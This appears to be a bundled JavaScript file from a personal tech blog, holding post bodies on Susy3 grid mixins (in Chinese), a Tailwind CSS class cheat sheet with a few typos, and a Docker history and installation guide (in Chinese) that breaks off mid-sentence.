欄位的兩端無間隔</li>\n<li><code>wide</code> : 每個欄位左右皆會有間隔</li>\n<li><code>wider</code> : 欄位的兩端會多一份間隔</li>\n</ol>\n<p>使用前需將 <code>box-sizing</code> 設定為 <code>border-box</code></p>\n<p><code>* { box-sizing: border-box; }</code></p>\n<h4 id=\"4-全域設定\">4. 全域設定</h4>\n<p>全域設定的 4 個設定變數儲存於 <code>$susy</code> 變數裡，可以從此進行修改，以下為預設值。</p>\n<pre class=\"language-css=\"><code class=\"language-css=\">$susy: (\n  \"columns\": susy-repeat(4),\n  \"gutters\": 0.25,\n  \"spread\": \"narrow\",\n  \"container-spread\": \"narrow\"\n);</code></pre><h3 id=\"使用\">使用</h3>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://jsnwork.kiiuo.com/archives/2805/css-susy3-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/\">CSS – SUSY3 – 使用方法(2)</a></p>\n<h4 id=\"1span\">1.<code>span()</code></h4>\n<p>設定元素的佔欄位數。</p>\n<pre class=\"language-css=\"><code class=\"language-css=\">[col=\"4\"] {\n  width: span(4);\n}</code></pre><h4 id=\"2-gutter\">2. <code>gutter()</code></h4>\n<p>設定元素是否佔用間隔。</p>\n<pre class=\"language-css=\"><code class=\"language-css=\">[col=\"4\"] {\n  width: span(4) + gutter();\n}</code></pre><h4 id=\"3-斷點設計-susy-use-與-susy-at-mixin\">3. 斷點設計 <code>susy-use</code> 與 <code>susy-at</code> mixin</h4>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/oddbird/susy/issues/658\">Change grid settings based on responsive breakpoints in Susy 3 #658</a>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.oddbird.net/2017/09/25/susy-use/\">media queries &amp; grid settings</a></p>\n<p>如果想藉由不同的斷點改變排板，需要在不同的 media query 裡重新設定一次全域變數，因此我們可以透過另外新增兩個 mixin 傳入斷點變數設定來簡化修改：</p>\n<ol>\n<li><code>susy-use</code></li>\n</ol>\n<p>將斷點變數從 media query 裡獨立出來。</p>\n<pre class=\"language-css=\"><code class=\"language-css=\">@mixin susy-use($config) {\n  $config: susy-compile($config);\n\n  $global: $susy;\n  $susy: map-merge($susy, $config) !global;\n\n  @content;\n\n  $susy: $global !global;\n}</code></pre><p>範例：</p>\n<pre class=\"language-css=\"><code class=\"language-css=\">// 不同斷點裡的欄位與間隔設定\n$medium: (\n  \"columns\": susy-repeat(8),\n  \"gutters\": 1em,\n);\n\n@media (min-width: 30em) {\n  @include susy-use($medium) {\n    // 此區塊的內容會套用 $medium 的設定。\n  }\n}</code></pre><ol start=\"2\">\n<li><code>susy-at</code></li>\n</ol>\n<p>可以直接在 media query 之外的變數裡設定斷點大小。\n※使用此 mixin 亦需引入 <code>susy-use</code>！</p>\n<pre class=\"language-css=\"><code class=\"language-css=\">@mixin susy-at($config) {\n  $config: susy-compile($config);\n\n  $min: map-get($config, \"min-width\");\n  $min: if($min, \"(min-width: #{$min})\", null);\n  $max: map-get($config, \"max-width\");\n  $max: if($max, \"(max-width: #{$max})\", null);\n\n  $and: if($min and $max, \"#{$min} and #{$max}\", null);\n\n  $query: $and or $min or $max;\n\n  @media #{$query} {\n    @include susy-use($config) {\n      @content;\n    }\n  }\n}</code></pre><p>範例：</p>\n<pre class=\"language-css=\"><code class=\"language-css=\">// 不同斷點的斷點大小、欄位與間隔設定\n$medium: (\n  \"min-width\": 30em,\n  \"columns\": susy-repeat(8),\n  \"gutters\": 1em\n);\n\n@include susy-at($medium) {\n  // 此區塊會建立新斷點\n  // 此區塊的內容會套用 $medium 的設定。\n}</code></pre><ol start=\"3\">\n<li><code>gallery</code></li>\n</ol>\n<pre class=\"language-css\"><code class=\"language-css\">// <span class=\"token property\">https</span><span class=\"token punctuation\">:</span>//github.com/oddbird/susy/issues/648\n<span class=\"token atrule\"><span class=\"token rule\">@mixin</span> <span class=\"token function\">gallery</span><span class=\"token punctuation\">(</span>$span<span class=\"token punctuation\">,</span> $<span class=\"token property\">config</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n  $<span class=\"token property\">grid</span><span class=\"token punctuation\">:</span> <span class=\"token function\">susy-compile</span><span class=\"token punctuation\">(</span>$span<span class=\"token punctuation\">,</span> $config<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  $<span class=\"token property\">span</span><span class=\"token punctuation\">:</span> <span class=\"token function\">map-get</span><span class=\"token punctuation\">(</span>$grid<span class=\"token punctuation\">,</span> <span class=\"token string\">\"span\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  $<span class=\"token property\">column-count</span><span class=\"token punctuation\">:</span> <span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token function\">map-get</span><span class=\"token punctuation\">(</span>$grid<span class=\"token punctuation\">,</span> <span class=\"token string\">\"columns\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  $<span class=\"token property\">count</span><span class=\"token punctuation\">:</span> <span class=\"token function\">floor</span><span class=\"token punctuation\">(</span>$column-count / $span<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  $<span class=\"token property\">spread</span><span class=\"token punctuation\">:</span> <span class=\"token function\">map-get</span><span class=\"token punctuation\">(</span>$grid<span class=\"token punctuation\">,</span> <span class=\"token string\">\"spread\"</span><span class=\"token punctuation\">)</span> + 2<span class=\"token punctuation\">;</span>\n  $<span class=\"token property\">container-spread</span><span class=\"token punctuation\">:</span> <span class=\"token function\">map-get</span><span class=\"token punctuation\">(</span>$grid<span class=\"token punctuation\">,</span> <span class=\"token string\">\"container-spread\"</span><span class=\"token punctuation\">)</span> + 2<span class=\"token punctuation\">;</span>\n  $<span class=\"token property\">extra</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span>$container-spread - $spread<span class=\"token punctuation\">)</span> * 0.5<span class=\"token punctuation\">;</span>\n  $<span class=\"token property\">extra-push</span><span class=\"token punctuation\">:</span> <span class=\"token function\">su-call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"su-gutter\"</span><span class=\"token punctuation\">,</span> $grid<span class=\"token punctuation\">)</span> * $extra<span class=\"token punctuation\">;</span>\n\n  <span class=\"token property\">float</span><span class=\"token punctuation\">:</span> left<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">margin-right</span><span class=\"token punctuation\">:</span> -100%<span class=\"token punctuation\">;</span>\n\n  <span class=\"token atrule\"><span class=\"token rule\">@for</span> $n from 1 through <span class=\"token punctuation\">(</span>$count<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n    $<span class=\"token property\">nth</span><span class=\"token punctuation\">:</span> <span class=\"token function\">unquote</span><span class=\"token punctuation\">(</span><span class=\"token selector\">\"#</span><span class=\"token punctuation\">{</span>$count<span class=\"token punctuation\">}</span><span class=\"token selector\">n + #</span><span class=\"token punctuation\">{</span>$n<span class=\"token punctuation\">}</span>\"<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    $<span class=\"token property\">location</span><span class=\"token punctuation\">:</span> $span * <span class=\"token punctuation\">(</span>$n - 1<span class=\"token punctuation\">)</span> + 1<span class=\"token selector\">;\n\n    &amp;:nth-child(#</span><span class=\"token punctuation\">{</span>$nth<span class=\"token punctuation\">}</span><span class=\"token selector\">)</span> <span class=\"token punctuation\">{</span>\n      $<span class=\"token property\">width</span><span class=\"token punctuation\">:</span> <span class=\"token function\">susy-compile</span><span class=\"token punctuation\">(</span>$span at $location<span class=\"token punctuation\">,</span> $grid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> <span class=\"token function\">su-call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"su-span\"</span><span class=\"token punctuation\">,</span> $width<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n      <span class=\"token atrule\"><span class=\"token rule\">@if</span> <span class=\"token punctuation\">(</span>$location > 1<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">{</span>\n        $<span class=\"token property\">wide</span><span class=\"token punctuation\">:</span> <span class=\"token function\">susy-compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"first\"</span> $location - 1 <span class=\"token string\">\"wide\"</span><span class=\"token punctuation\">,</span> $grid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token property\">clear</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n        <span class=\"token property\">margin-left</span><span class=\"token punctuation\">:</span> <span class=\"token function\">su-call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"su-span\"</span><span class=\"token punctuation\">,</span> $wide<span class=\"token punctuation\">)</span> + $extra-push<span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span> <span class=\"token atrule\"><span class=\"token rule\">@else</span></span> <span class=\"token punctuation\">{</span>\n        <span class=\"token property\">clear</span><span class=\"token punctuation\">:</span> both<span class=\"token punctuation\">;</span>\n        <span class=\"token property\">margin-left</span><span class=\"token punctuation\">:</span> <span class=\"token function\">if</span><span class=\"token punctuation\">(</span>$extra-push > 0<span class=\"token punctuation\">,</span> $extra-push<span class=\"token punctuation\">,</span> 0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre><h3 id=\"範例\">範例</h3>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/mirisuzanne/pen/BZjMXK?editors=0100\">Susy3: Pushing, Pulling, and Padding</a>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/marco3w/pen/KJEKNM?editors=0100\">Grid: Susy 3</a>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://codepen.io/f6bfb5/pen/voObgB\">https://codepen.io/f6bfb5/pen/voObgB</a>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://sass-lang.com/documentation/interpolation\">https://sass-lang.com/documentation/interpolation</a></p>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/terrierscript/items/fe6cc48ab98ffd6c55e2\">なぜ 960px がグリッドにするときに良いのか計算してみた</a>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://gridcalculator.dk/\">Grid Calculator</a></p>\n","date":"2019-11-09T00:32:49.000Z","excerpt":"","printDate":"November 9, 2019","printReadingTime":"3 min read"};

var route_71 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod45
});

var Mod46 = {"title":"CSS Tailwindcss","slug":"css-tailwind","html":"<h2 id=\"installation\">Installation</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://tailwindcss.com/docs/installation\">Document</a></li>\n</ul>\n<h3 id=\"1-install-tailwind-via-npm\">1. Install Tailwind via npm</h3>\n<p><code>npm install tailwindcss</code>\n<code>yarn add tailwindcss</code></p>\n<h3 id=\"2-add-tailwind-to-css\">2. Add Tailwind to CSS</h3>\n<pre class=\"language-css\"><code class=\"language-css\"><span class=\"token atrule\"><span class=\"token rule\">@tailwind</span> base<span class=\"token punctuation\">;</span></span>\n<span class=\"token atrule\"><span class=\"token rule\">@tailwind</span> components<span class=\"token punctuation\">;</span></span>\n<span class=\"token atrule\"><span class=\"token rule\">@tailwind</span> utilities<span class=\"token punctuation\">;</span></span></code></pre><p>or</p>\n<pre class=\"language-js\"><code class=\"language-js\">@<span class=\"token keyword\">import</span> \"tailwindcss<span class=\"token operator\">/</span>base<span class=\"token punctuation\">;</span>\n@<span class=\"token keyword\">import</span> \"tailwindcss<span class=\"token operator\">/</span>componeonts<span class=\"token punctuation\">;</span>\n@<span class=\"token keyword\">import</span> \"tailwindcss<span class=\"token operator\">/</span>utilities<span class=\"token punctuation\">;</span></code></pre><h3 id=\"via-cdn\">via CDN</h3>\n<p><code>&lt;link href=&quot;https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css&quot; rel=&quot;stylesheet&quot;&gt;</code></p>\n<h2 id=\"layout\">Layout</h2>\n<h3 id=\"container\">Container</h3>\n<p><code>.container</code></p>\n<h3 id=\"display\">Display</h3>\n<p><code>.block</code>\n<code>.inline-block</code>\n<code>.inline</code>\n<code>.flex</code>\n<code>.inline-flex</code>\n<code>.table</code>\n<code>.table-row</code>\n<code>.table-cell</code>\n<code>.hidden</code></p>\n<h3 id=\"floats\">Floats</h3>\n<p><code>.float-right</code>\n<code>.float-left</code>\n<code>.float-none</code>\n<code>.clearfix</code></p>\n<h3 id=\"object-fit\">Object Fit</h3>\n<p><code>.object-contain</code>\n<code>.object-cover</code>\n<code>.object-fill</code>\n<code>.object-none</code>\n<code>.object-scale-down</code></p>\n<h3 id=\"object-position\">Object Position</h3>\n<p><code>.object-bottom</code>\n<code>.object-center</code>\n<code>.object-left</code>\n<code>.object-left-bottom</code>\n<code>.object-left-top</code>\n<code>.object-right</code>\n<code>.object-right-bottom</code>\n<code>.object-right-top</code>\n<code>.object-top</code></p>\n<h3 id=\"overflow\">Overflow</h3>\n<p><code>.overflow-auto</code>\n<code>.overflow-hidden</code>\n<code>.overflow-visible</code>\n<code>.overflow-scroll</code>\n<code>.overflow-x-auto</code>\n<code>.overflow-y-auto</code>\n<code>.overflow-x-hidden</code>\n<code>.overflow-y-hidden</code>\n<code>.overflow-x-visible</code>\n<code>.overflow-y-visible</code>\n<code>.overflow-x-scroll</code>\n<code>.overflow-y-scroll</code>\n<code>.scrolling-touch</code>\n<code>.scrolling-auto</code></p>\n<h3 id=\"position\">Position</h3>\n<p><code>.static</code>\n<code>.fixed</code>\n<code>.absolute</code>\n<code>.relative</code>\n<code>.sticky</code></p>\n<h3 id=\"top--right--bottom--left\">Top / Right / Bottom / Left</h3>\n<p><code>.inset-0</code>\n<code>.inset-y-0</code>\n<code>.inset-x-0</code>\n<code>.top-0</code>\n<code>.right-0</code>\n<code>.bottom-0</code>\n<code>.left-0</code>\n<code>.inset-auto</code>\n<code>.inset-y-auto</code>\n<code>.inset-x-auto</code>\n<code>.top-auto</code>\n<code>.bottom-auto</code>\n<code>.left-auto</code>\n<code>.right-auto</code></p>\n<h3 id=\"visibility\">Visibility</h3>\n<p><code>.visible</code>\n<code>.invisible</code></p>\n<h3 id=\"z-index\">Z-index</h3>\n<p><code>.z-0</code>\n<code>.z-10</code>\n<code>.z-20</code>\n<code>.z-30</code>\n<code>.z-40</code>\n<code>.z-50</code>\n<code>.z-auto</code></p>\n<h2 id=\"typography\">Typography</h2>\n<h3 id=\"font-family\">Font Family</h3>\n<p><code>.font-sans</code>\n<code>.font-serif</code>\n<code>.font-mono</code></p>\n<h3 id=\"font-size\">Font Size</h3>\n<p><code>.text-xs</code>\n<code>.text-sm</code>\n<code>.text-base</code>\n<code>.text-lg</code>\n<code>.text-xl</code>\n<code>.text-2xl</code>\n<code>.text-3xl</code>\n<code>.text-4xl</code>\n<code>.text-5xl</code>\n<code>.text-6xl</code></p>\n<h3 id=\"font-sommthing\">Font Sommthing</h3>\n<p><code>.antialiased</code>\n<code>.subpixel-antialiased</code></p>\n<h3 id=\"font-style\">Font Style</h3>\n<p><code>.italic</code>\n<code>.not-italic</code></p>\n<h3 id=\"font-weight\">Font Weight</h3>\n<p><code>.font-hairline</code>\n<code>.font-thin</code>\n<code>.font-light</code>\n<code>.font-normal</code>\n<code>.font-medium</code>\n<code>.font-semibold</code>\n<code>.font-bold</code>\n<code>.font-extrabold</code>\n<code>.font-black</code></p>\n<h3 id=\"letter-spacing\">Letter Spacing</h3>\n<p><code>.tracking-tighter</code>\n<code>.tracking-tight</code>\n<code>.tracking-normal</code>\n<code>.tracking-wide</code>\n<code>.tracking-wider</code>\n<code>.tracking-widest</code></p>\n<h3 id=\"line-height\">Line Height</h3>\n<p><code>.leading-none</code>\n<code>.leading-tight</code>\n<code>.leading-sung</code>\n<code>.leading-normal</code>\n<code>.leading-relaxed</code>\n<code>.leading-loose</code></p>\n<h3 id=\"list-style-type\">List Style Type</h3>\n<p><code>.list-none</code>\n<code>.list-disc</code>\n<code>.list-decimal</code></p>\n<h3 id=\"list-style-position\">List Style Position</h3>\n<p><code>.list-inside</code>\n<code>.list-outside</code></p>\n<h3 id=\"placeholder-color\">Placeholder Color</h3>\n<p><code>.placeholder-transparent</code>\n<code>.placeholder-black</code>\n<code>.placeholder-white</code>\n<code>.placeholder-[gray/red/orange/yellow/green/teal/blue/indigo/purple/pink]-[100-900]</code></p>\n<h3 id=\"text-alignment\">Text Alignment</h3>\n<p><code>.text-left</code>\n<code>.text-center</code>\n<code>.text-right</code>\n<code>.text-justify</code></p>\n<h3 id=\"text-color\">Text Color</h3>\n<p><code>.text-transparent</code>\n<code>.text-black</code>\n<code>.text-white</code>\n<code>.text-[gray/red/orange/yellow/green/teal/blue/indigo/purple/pink]-[100-900]</code></p>\n<h3 id=\"text-decoration\">Text Decoration</h3>\n<p><code>.underline</code>\n<code>.line-through</code>\n<code>.no-underline</code></p>\n<h3 id=\"text-transform\">Text Transform</h3>\n<p><code>.uppercase</code>\n<code>.lowercase</code>\n<code>.capitalize</code>\n<code>.normal-case</code></p>\n<h3 id=\"vertical-alignment\">Vertical Alignment</h3>\n<p><code>.align-baseline</code>\n<code>.align-top</code>\n<code>.align-middle</code>\n<code>.align-bottom</code>\n<code>.align-text-top</code>\n<code>.align-text-bottom</code></p>\n<h3 id=\"whitespace\">Whitespace</h3>\n<p><code>.whitespace-normal</code>\n<code>.whitespace-no-wrap</code>\n<code>.whitespace-pre</code>\n<code>.whitespace-pre-line</code>\n<code>.whitespace-pre-wrap</code></p>\n<h3 id=\"word-break\">Word Break</h3>\n<p><code>.break-normal</code>\n<code>.break-words</code>\n<code>.break-all</code>\n<code>.truncate</code></p>\n<h2 id=\"backgrounds\">Backgrounds</h2>\n<h3 id=\"background-attachment\">Background Attachment</h3>\n<p><code>.bg-fixed</code>\n<code>.bg-local</code>\n<code>.bg-scroll</code></p>\n<h3 id=\"background-color\">Background Color</h3>\n<p><code>.bg-transparent</code>\n<code>.bg-black</code>\n<code>.bg-white</code>\n<code>.bg-[gray/red/orange/yellow/green/teal/blue/indigo/purple/pink]-[100-900]</code></p>\n<h3 id=\"background-position\">Background Position</h3>\n<p><code>.bg-bottom</code>\n<code>.bg-center</code>\n<code>.bg-left</code>\n<code>.bg-left-bottom</code>\n<code>.bg-left-top</code>\n<code>.bg-right</code>\n<code>.bg-right-bottom</code>\n<code>.bg-right-top</code>\n<code>.bg-top</code></p>\n<h3 id=\"background-repeat\">Background Repeat</h3>\n<p><code>.bg-repeat</code>\n<code>.bg-no-repeat</code>\n<code>.bg-repeat-x</code>\n<code>.bg-repeat-y</code>\n<code>.bg-repeat-round</code>\n<code>.bg-repeat-space</code></p>\n<h3 id=\"background-size\">Background Size</h3>\n<p><code>.bg-auto</code>\n<code>.bg-cover</code>\n<code>.bg-contain</code></p>\n<h2 id=\"borders\">Borders</h2>\n<h3 id=\"border-color\">Border Color</h3>\n<p><code>.border-transparent</code>\n<code>.border-black</code>\n<code>.border-white</code>\n<code>.border-[gray/red/orange/yellow/green/teal/blue/indigo/purple/pink]-[100-900]</code></p>\n<h3 id=\"border-style\">Border Style</h3>\n<p><code>.border-solid</code>\n<code>.border-dashed</code>\n<code>.border-dotted</code>\n<code>.border-double</code>\n<code>.border-none</code></p>\n<h3 id=\"border-width\">Border Width</h3>\n<p><code>.border</code>\n<code>.border-2</code>\n<code>.border-4</code>\n<code>.border-8</code>\n<code>.border-t</code>\n<code>.border-r</code>\n<code>.border-b</code>\n<code>.border-l</code>\n<code>.border-{side}-{2/4/6/8}</code></p>\n<h3 id=\"border-radius\">Border Radius</h3>\n<p><code>.rounded-none</code>\n<code>.rounded-sm</code>\n<code>.rounded</code>\n<code>.rounded-lg</code>\n<code>.rounded-full</code>\n<code>.rounded-t</code>\n<code>.rounded-r</code>\n<code>.rounded-b</code>\n<code>.rounded-l</code>\n<code>.rounded-tl</code>\n<code>.rounded-tr</code>\n<code>.rounded-br</code>\n<code>.rounded-bl</code>\n<code>.rounded-{t|r|b|l}{-size?}</code>\n<code>.rounded-{tl|tr|br|bl}{-size?}</code></p>\n<h2 id=\"flexbox\">Flexbox</h2>\n<h3 id=\"flex-direction\">Flex Direction</h3>\n<p><code>.flex-row</code>\n<code>.flex-row-reverse</code>\n<code>.flex-col</code>\n<code>.flex-col-reverse</code></p>\n<h3 id=\"flex-wrap\">Flex Wrap</h3>\n<p><code>.flex-no-wrap</code>\n<code>.flex-wrap</code>\n<code>.flex-wrap-reverse</code></p>\n<h3 id=\"align-items\">Align Items</h3>\n<p><code>.items-stretch</code>\n<code>.items-start</code>\n<code>.items-center</code>\n<code>.items-end</code>\n<code>.items-baseline</code></p>\n<h3 id=\"align-content\">Align Content</h3>\n<p><code>.content-start</code>\n<code>.content-center</code>\n<code>.content-end</code>\n<code>.content-between</code>\n<code>.content-around</code></p>\n<h3 id=\"align-self\">Align Self</h3>\n<p><code>.self-auto</code>\n<code>.self-start</code>\n<code>.self-center</code>\n<code>.self-end</code>\n<code>.self-stretch</code></p>\n<h3 id=\"justify-content\">Justify Content</h3>\n<p><code>.justify-start</code>\n<code>.justify-center</code>\n<code>.justify-end</code>\n<code>.justify-between</code>\n<code>.justify-around</code></p>\n<h3 id=\"flex\">Flex</h3>\n<p><code>.flex-initial</code>\n<code>.flex-1</code>\n<code>.flex-auto</code>\n<code>.flex-none</code></p>\n<h3 id=\"flex-grow\">Flex Grow</h3>\n<p><code>.flex-grow</code>\n<code>.flex-grow-0</code></p>\n<h3 id=\"flex-shrink\">Flex Shrink</h3>\n<p><code>.flex-shrink</code>\n<code>.flex-shrink-0</code></p>\n<h3 id=\"order\">Order</h3>\n<p><code>.order-first</code>\n<code>.order-last</code>\n<code>.order-none</code>\n<code>.order-{1-12}</code></p>\n<h2 id=\"spacing\">Spacing</h2>\n<h3 id=\"padding\">Padding</h3>\n<p><code>.p-{0-6|8|10|12|16|20|24|32|40|48|56|64|px}</code>\n<code>.py-{0-6|8|10|12|16|20|24|32|40|48|56|64|px}</code>\n<code>.px-{0-6|8|10|12|16|20|24|32|40|48|56|64|px}</code>\n<code>.pt-{0-6|8|10|12|16|20|24|32|40|48|56|64|px}</code>\n<code>.pr-{0-6|8|10|12|16|20|24|32|40|48|56|64|px}</code>\n<code>.pb-{0-6|8|10|12|16|20|24|32|40|48|56|64|px}</code>\n<code>.pl-{0-6|8|10|12|16|20|24|32|40|48|56|64|px}</code></p>\n<h3 id=\"margin\">Margin</h3>\n<p><code>.m-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.-m-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.my-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.-my-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.mx-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.-mx-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.mt-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.-mt-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.mr-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.-mr-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.mb-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.-mb-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.ml-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.-ml-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code></p>\n<h2 id=\"sizing\">Sizing</h2>\n<h3 id=\"width\">Width</h3>\n<p><code>.w-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.w-{1/2|{1-2}/3|{1-3}/4|{1-4}/5|{1-5}/6}</code>\n<code>.w-{1-11}/12</code>\n<code>.w-full</code>\n<code>.w-screen</code></p>\n<h3 id=\"min-width\">Min-Width</h3>\n<p><code>.min-w-0</code>\n<code>.min-w-full</code></p>\n<h3 id=\"max-width\">Max-Width</h3>\n<p><code>.max-w-{xs|sm|md|lg|xl|{2-6}xl|full}</code></p>\n<h3 id=\"height\">Height</h3>\n<p><code>.h-{0-6|8|10|12|16|20|24|32|40|48|56|64|auto|px}</code>\n<code>.h-full</code>\n<code>.h-screen</code></p>\n<h3 id=\"min-height\">Min-Height</h3>\n<p><code>.min-h-0</code>\n<code>.min-h-full</code>\n<code>.min-h-screen</code></p>\n<h3 id=\"max-height\">Max-Height</h3>\n<p><code>.max-h-full</code>\n<code>.max-h-screen</code></p>\n<h2 id=\"tables\">Tables</h2>\n<h3 id=\"border-collapse\">Border Collapse</h3>\n<p><code>.border-collapse</code>\n<code>.border-separate</code></p>\n<h3 id=\"table-layout\">Table Layout</h3>\n<p><code>.table-auto</code>\n<code>.table-fixed</code></p>\n<h2 id=\"effects\">Effects</h2>\n<h3 id=\"box-shadow\">Box Shadow</h3>\n<p><code>.shadow</code>\n<code>.shadow-{md|lg|xl|2xl|inner|outline|none}</code></p>\n<h3 id=\"opacity\">Opacity</h3>\n<p><code>.opaticy-{100|75|50|25|0}</code></p>\n<h2 id=\"interactivity\">Interactivity</h2>\n<h3 id=\"appearance\">Appearance</h3>\n<p><code>.appearance-none</code></p>\n<h3 id=\"cursor\">Cursor</h3>\n<p><code>.cursor-{auto|default|pointer|wait|text|move|not-allowed}</code></p>\n<h3 id=\"outline\">Outline</h3>\n<p><code>.outline-none</code></p>\n<h3 id=\"pointer-events\">Pointer Events</h3>\n<p><code>.pointer-events-none</code>\n<code>.pointer-events-auto</code></p>\n<h3 id=\"resize\">Resize</h3>\n<p><code>.resize-none</code>\n<code>.resize</code>\n<code>.resize-{y|x}</code></p>\n<h3 id=\"user-select\">User Select</h3>\n<p><code>.select-{none|text|all|auto}</code></p>\n<h2 id=\"svg\">SVG</h2>\n<h3 id=\"fill\">Fill</h3>\n<p><code>.fill-current</code></p>\n<h3 id=\"stroke\">Stroke</h3>\n<p><code>.stroke-current</code></p>\n<h2 id=\"accessibility\">Accessibility</h2>\n<h3 id=\"screen-readers\">Screen Readers</h3>\n<p><code>.sr-only</code>\n<code>.not-sr-only</code></p>\n","date":"2019-12-06T13:19:59.000Z","excerpt":"","printDate":"December 6, 2019","printReadingTime":"3 min read"};

var route_59 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod46
});

var Mod47 = {"title":"Docker","slug":"docker","html":"<p>Docker 的出現，是為了解決在 deploy 作業途中時會出現的各種問題。</p>\n<h2 id=\"deploy-的歷史\">Deploy 的歷史</h2>\n<p>早前的網路環境 (約莫至 1990 年左右) 是以一台大型電腦做為伺服器，處理所有的 request，但是這樣的設計會受限於製造商的品牌硬體，造成高成本、欠缺柔軟性和擴充性的問題。</p>\n<p>之後技術進步，隨著小型電腦的性能提升與價格下降，出現了串接多台小型電腦，分散配置系統與功能的構築手法，這種手法稱為 Engine downsizing，成為了當時的主流作法，但這波變化又帶來了新的問題。</p>\n<h3 id=\"虛擬化\">虛擬化</h3>\n<p>首先不難想像的是隨著電腦增加造成的管理與使用的困難，有 100 台電腦就需要進行 100 次的環境設定，若之後有更新也要這 100 台電腦全部都裝過一遍，並且這些電腦並不是時常保持滿載處理的，總是會出現閒置的電腦。</p>\n<p>並且在安全性與維護性上也有所疑慮，當其中一台電腦受到攻擊，就會影響到所有在上面執行的程式。</p>\n<p>以及隨著作業系統的多樣化，會有在不相容的伺服器上無法執行的程式，這時出現的技術就是虛擬化，透過軟體整合多種硬體，能夠自由模擬各種規格的電腦環境。</p>\n<p>雖然虛擬化以及虛擬機器的登場解決了許多 deploy 時會遇到的問題，但虛擬機器也有其弱點，那就是系統背後執行的，其它與程式無關的系統服務，會造成大量的系統開銷與資源浪費。</p>\n<h3 id=\"容器（container）虛擬化\">容器（Container）虛擬化</h3>\n<p>於是容器虛擬化因而誕生了。容器虛擬化指的是執行的程式自開發與執行環境隔離開來，能夠安全並且快速地執行多個程式。並且這套技術不需要安裝新的作業系統，而是透過系統的多個功能，讓應用程式在同一個作業系統上，執行於不同的容器隔離空間中。</p>\n<h3 id=\"docker\">Docker</h3>\n<p>Docker 就是使用了容器虛擬化的應用程式之一，而也有許多其它使用容器虛擬化的應用程式存在。</p>\n<p>Docker 以名為 <code>Dockerfile</code> 的檔案做為基底產生容器（執行程式），Docker 會依照檔案內所記載的依序執行指令。因此擁有 1. 能夠簡單多次產生容器 2. 能夠將容器帶著走 3. 能夠簡便管理應用程式的版本 等等許多優點。</p>\n<p>原本 Docker 是 LinuxOS 專用的功能，之後 macOS 和 Windows 上面也有了如 <code>Docker Desktop for Mac</code> 或 <code>Docker for Windows</code> 這類先於電腦上執行 Linux 環境的虛擬機器，再於其中執行 Docker 的應用程式。</p>\n<h2 id=\"安裝\">安裝</h2>\n<ul>\n<li>MAC、Windows：<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.docker.com/products/docker-desktop\">Docker Desktop for Mac and Windows | Docker</a></li>\n<li>Linux：\n<br>├ 移除舊版本：<code>sudo apt-get remove docker docker-engine docker.io</code>\n<br>├ 使用腳本安裝：<code>curl -fsSL https://get.docker.com -o get-docker.sh</code>\n<br>│ <code>sudo sh get-docker.sh</code>\n<br>├ 若想使用非 root 使用者執行 